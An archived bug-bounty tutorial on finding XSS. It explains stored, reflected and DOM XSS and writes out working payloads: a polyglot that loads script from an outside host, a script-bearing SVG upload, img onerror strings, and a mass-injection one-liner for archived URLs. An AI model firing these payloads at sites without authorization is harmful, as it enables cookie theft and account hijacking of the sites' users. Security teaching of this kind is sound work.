# Find XSS on the Fly ( Full guide )

- **Source URL:** https://medium.com/@zack0x01_/find-xss-on-the-fly-full-guide-300f07fb86ae?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20251119091415/https://medium.com/@zack0x01_/find-xss-on-the-fly-full-guide-300f07fb86ae
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/6640 (id 6640)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Find XSS on the Fly 🔥( Full guide )

## Hello Hackers 🧑💻👋

In today’s article, I want to share with you my experience in finding one of the most critical vulnerabilities in the bug bounty world and hacking in general. Let’s begin!

## What is Cross-Site Scripting (XSS) 👀 :

is a type of security vulnerability commonly found in web applications. It occurs when an attacker is able to inject malicious scripts into content that is then delivered to other users. These scripts are typically executed in the context of the victim’s browser, allowing the attacker to steal information, hijack sessions, or perform other malicious actions.

## **Types of XSS 🧑💻:**

### **1 . Stored XSS (Persistent XSS):**

- **Description:** The malicious script is permanently stored on the target server, such as in a database, comment field, or message board.
- **Impact:** When users retrieve the stored information, the script is executed in their browser, leading to widespread exploitation.

on of the famous stories of stored xss is from the famous hacker “**Samy** Kamkar “ his virus called “Samy Worm” that infected millions of user on MSN .🙂🧑💻

more about his story on : [https://www.youtube.com/watch?v=Hd\_cC7DUSCE](https://www.youtube.com/watch?v=Hd_cC7DUSCE)

### where you can find it , and how you test it ?:

### 🚨 Stored XSS :

stored XSS is one of the critical bugs you can find in any target. Why? 🤔

Imagine you’re visiting Facebook, and there’s a malicious script hidden in the background of the HTML and JavaScript of the page. Malicious hackers control it! They can literally:

- 🕵️♂️ Steal your cookies 🍪
- 🔗 Redirect you to any page they want
- 👀 Get a live view of what you’re looking at by injecting a stored cross-site scripting payload from tools like **BXSS xss.report** and **KNOXSS** too.

This gives them **full control** over the vulnerable page. What’s even crazier is they can inject a script that opens your camera (with your permission, of course) .

But in bug bounty hunting, all you need to do is prove that you can inject a script on the victim’s account and focus on **the victim 🧑💻**. If you can’t deliver it to the victim, it’s **still a bug** but has no impact since you **can’t affect other users**.

### Let’s get into finding the bug now! 🐞

To simplify the idea: you can inject your malicious payload into anything that appears on the browser and gets reflected as a value, like:

- First name and last name 🙂
- Comment sections 💬
- Descriptions 📝
- Contact and Book a demo forms 📝
- Even user agents! For example, a page displaying user logs to the admin and showing the browser version of their users. If they have no filter for that, it can be a stored XSS.

Sometimes, you can’t see the reflection because it’s DOM XSS. You have to read through the JavaScript files to find where it’s being reflected. But don’t worry, we’re not missing that! You can use \*\*polygots\*\* to find that too.

### What is a polygot? 🤓

**A short definition**: it’s a malicious payload meant to cover all places of reflection (DOM, reflected XSS, stored XSS). Here’s an example by [@KNOXSS](http://twitter.com/KNOXSS):

``JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<! →</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\X55.is?1=14564/.source))}//\76 →``
Make sure to inject that everywhere you have an on-input simple trick. Inject your payloads on the HTTP request, not on the browser, to bypass JavaScript regex and filters. 🎯

**make your injecting process easy 🤓 :**

you use Burp Suit match and replace option to make the injection process easy , for example : match ( **XSS01** ) with ( **\<img/src=x onerror=confirm(1)>** ) , so every time you type XSS01 in the burp suit background it will change to make the testing process easy :)

### Stored XSS by file upload 🙂🗃:

in most of the moder web or mobile apps they have the option of uploading your profile picture , and here is the game you can upload a normal picture , but on SVG format , if you are able to upload and SVG picture you got a stored xss ! , how ?

when saying upload an SVG picture i don’t mean just a picture but a mlicious SVG picture that have a malicious script inside it you can find a planty of these images online by typing ( XSS on svg ) , or you can download it from this page

`https://gist.github.com/rudSarkar/76f1ce7a65c356a5cd71d058ab76a344`
or simply by save this script as ( image.svg ) and upload it on every file upload option , if successful , try to find the path of the image , if you open the link of the image and execute , congrats you got an stored xss :)

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('xss');
   </script>
</svg>
```
and always look for bypasses don’t just stop on filters that say you are not able to upload this kind of type file , you read more on file upload filter bypass on :

### Stored XSS on PDF.js CVE-2024–4367 👀

🚨**Don’t get distracted by the word CVE** it’s not a monster to be scared of🧟♂️

A **CVE** (Common Vulnerabilities and Exposures) is just a vulnerable version of some specific product. **How can we test that? 🤔**

This particular CVE works on applications that use **PDF.js**, a PDF viewer. Here’s what you need to do:

1. Whenever you see an app using this technology, upload a vulnerable PDF file 📄.
2. If you see any reflection while opening the file, you’ve got a **stored XSS! 🎯**

And I’ll say it again: always make sure to find a way to deliver it to the victim. If you can’t, it’s still a bug but with **0 impact. 😊**

**Malicious PDF files 😈:** [https://github.com/luigigubello/PayloadsAllThePDFs/tree/main/pdf-payloads](https://github.com/luigigubello/PayloadsAllThePDFs/tree/main/pdf-payloads)

**More deailts about this cve :** [https://medium.com/@osamaavvan/stored-xss-in-pdf-viewer-9cc5b955de2b](/@osamaavvan/stored-xss-in-pdf-viewer-9cc5b955de2b)

there so many more CVE that allow you to find this kind of vulnerbility

## **2. Reflected XSS (Non-Persistent XSS):**

- **Description:** The malicious script is reflected off a web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.
- **Impact:** The attacker needs to trick the victim into clicking a link that contains the malicious script, making it less widespread but still highly dangerous.

### How to find 🙂:

### Trick n°1:

well first thing i do when looking for this kind of vulnerability is to look for every , parameter that it reflecting its value to the dom , so we can know what kind of payload we inject and where it deliver .

you go and browse the app normally , make sure to click every button you find ( while burp proxy is on ) , then you go to burp history section and do scoop only select only request with parameter and go to the request one by one and inject your payload on these urls , there a high chance you will find a reflected XSS :

### Trick n°2:

XSS one liner :


`echo "testphp.vulnweb.com" | gauplus | grep "?" | qsreplace 'xssz"><img/src=x onerror=confirm(999)><!--' | httpx -mr '"><img/'`
what this command do ? : 1st it look for urls using a tool called **gauplus** or you can use **waybackurls** or **waymore ,** thes are great tools too to find archived urls **,**then it get all the urls with parameters and replace all the values of the parameter with the payload **xssz”>\<img/src=x onerror=confirm(999)>\<! —** than using **HTTPX** tool it will give you all the request that contain our malicious payload on the responce with no filters :)

### Tools:

## KNOXSS Community Edition by [Brute Logic](https://addons.mozilla.org/en-US/firefox/user/12642480/) :

this tool it will scan every URL you visit from reflected XSS , if its vulnerable it will pop up an alert(1) box ( make sure to turn the extension ON ) to make sure it scanning .

how a vulnerable website look like :)

or you can use the paid version of this tool its more effective , you get it on :[https://knoxss.me/](https://knoxss.me/)

there is more free XSS scanners like : Dalfox and Kxss they are usefull tools too .

## 🌐 DOM-based XSS

In this section, we’ll dive into DOM-based cross-site scripting (DOM XSS), explain how to find DOM XSS vulnerabilities, and talk about how to exploit DOM XSS with different sources and sinks.

### 🤔 What is DOM-based Cross-Site Scripting?

DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, like `eval()` or `innerHTML`. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

To deliver a DOM-based XSS attack, you need to place data into a source so that it propagates to a sink and causes the execution of arbitrary JavaScript.

### 🚀 Common Sources and Sinks

The most common source for DOM XSS is the **URL**, which is typically accessed with the `window.location` object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path.

For a detailed explanation of the taint flow between sources and sinks, please refer to the DOM-based vulnerabilities page.

## You can read more about xss WAF bypass on :

🔥Check out my YouTube channel here🔥 [https://www.youtube.com/@ZACK0X01](https://www.youtube.com/@ZACK0X01)

Happy hacking! 💻
